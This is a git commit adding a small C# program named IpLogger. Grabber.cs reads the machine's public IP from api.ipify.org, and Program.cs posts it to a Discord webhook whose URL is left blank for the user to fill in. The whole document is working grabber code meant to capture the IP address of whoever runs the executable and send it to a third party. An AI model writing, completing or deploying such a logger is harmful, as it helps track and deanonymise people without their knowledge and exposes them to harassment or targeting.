5e6296787e559b66bb9e803aa4694e7322d3e596
Yekta <99590210+Yeekta@users.noreply.github.com>
2024-07-14 13:00:19 +0300

    Add files via upload

---
+++ Grabber.cs
@@ -0,0 +1,21 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+
+namespace IpLogger
+{
+    internal class Grabber
+    {
+        public static string GetIp()
+        {
+            string ip = new WebClient().DownloadString("https://api.ipify.org/");
+            return ip;
+
+
+        }
+
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,24 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Collections.Specialized;
+
+namespace IpLogger
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            string webhook = "";// Discord Webhook urlsini Yazınız // Write the Discord webhook URL
+
+            var wbc = new WebClient();
+            var data = new NameValueCollection();
+            data["content"] = Grabber.GetIp();
+            wbc.UploadValues(webhook, data);
+        }
+    }
+}
